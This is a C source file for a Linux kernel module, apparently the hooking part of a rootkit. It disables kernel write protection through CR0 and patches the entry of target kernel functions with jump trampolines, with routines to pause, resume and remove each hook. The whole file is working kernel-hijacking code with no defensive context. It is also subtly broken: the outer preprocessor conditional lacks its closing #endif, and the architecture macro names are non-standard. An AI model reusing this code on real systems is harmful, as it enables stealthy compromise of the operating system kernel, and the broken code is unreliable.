#include <linux/slab.h>
#include <linux/kallsyms.h>
#include "common.h"

#if defined(_CONFIG_X86_)
    #define HIJACK_SIZE 6
#elif defined(_CONFIG_X86_64_)
    #define HIJACK_SIZE 12

struct sym_hook {
    void *addr;
    unsigned char o_code[HIJACK_SIZE];
    unsigned char n_code[HIJACK_SIZE];
    struct list_head list;
};

LIST_HEAD(hooked_syms);

inline unsigned long disable_wp ( void )
{
    unsigned long cr0;

    preempt_disable();
    barrier();

    cr0 = read_cr0();
    write_cr0(cr0 & ~X86_CR0_WP);
    return cr0;
}

inline void restore_wp ( unsigned long cr0 )
{
    write_cr0(cr0);

    barrier();
    preempt_enable();
}


void hijack_start ( void *target, void *new )
{
    struct sym_hook *sa;
    unsigned char o_code[HIJACK_SIZE], n_code[HIJACK_SIZE];

    #if defined(_CONFIG_X86_)
    unsigned long o_cr0;

    // push $addr; ret
    memcpy(n_code, "\x68\x00\x00\x00\x00\xc3", HIJACK_SIZE);
    *(unsigned long *)&n_code[1] = (unsigned long)new;
    #elif defined(_CONFIG_X86_64_)
    unsigned long o_cr0;

    // mov rax, $addr; jmp rax
    memcpy(n_code, "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0", HIJACK_SIZE);
    *(unsigned long *)&n_code[2] = (unsigned long)new;
    #endif

    printk("Hooking function 0x%p with 0x%p\n", target, new);

    memcpy(o_code, target, HIJACK_SIZE);

    o_cr0 = disable_wp();
    memcpy(target, n_code, HIJACK_SIZE);
    restore_wp(o_cr0);

    sa = kmalloc(sizeof(*sa), GFP_KERNEL);
    if ( ! sa )
        return;

    sa->addr = target;
    memcpy(sa->o_code, o_code, HIJACK_SIZE);
    memcpy(sa->n_code, n_code, HIJACK_SIZE);

    list_add(&sa->list, &hooked_syms);
}

void hijack_pause ( void *target )
{
    struct sym_hook *sa;

    printk("Pausing function hook 0x%p\n", target);

    list_for_each_entry ( sa, &hooked_syms, list )
        if ( target == sa->addr )
        {
            unsigned long o_cr0 = disable_wp();
            memcpy(target, sa->o_code, HIJACK_SIZE);
            restore_wp(o_cr0);
        }
}

void hijack_resume ( void *target )
{
    struct sym_hook *sa;

    printk("Resuming function hook 0x%p\n", target);

    list_for_each_entry ( sa, &hooked_syms, list )
        if ( target == sa->addr )
        {
            unsigned long o_cr0 = disable_wp();
            memcpy(target, sa->n_code, HIJACK_SIZE);
            restore_wp(o_cr0);

        }
}

void hijack_stop ( void *target )
{
    struct sym_hook *sa;

    printk("Unhooking function 0x%p\n", target);

    list_for_each_entry ( sa, &hooked_syms, list )
        if ( target == sa->addr )
        {
            unsigned long o_cr0 = disable_wp();
            memcpy(target, sa->o_code, HIJACK_SIZE);
            restore_wp(o_cr0);

            list_del(&sa->list);
            kfree(sa);
            break;
        }
}
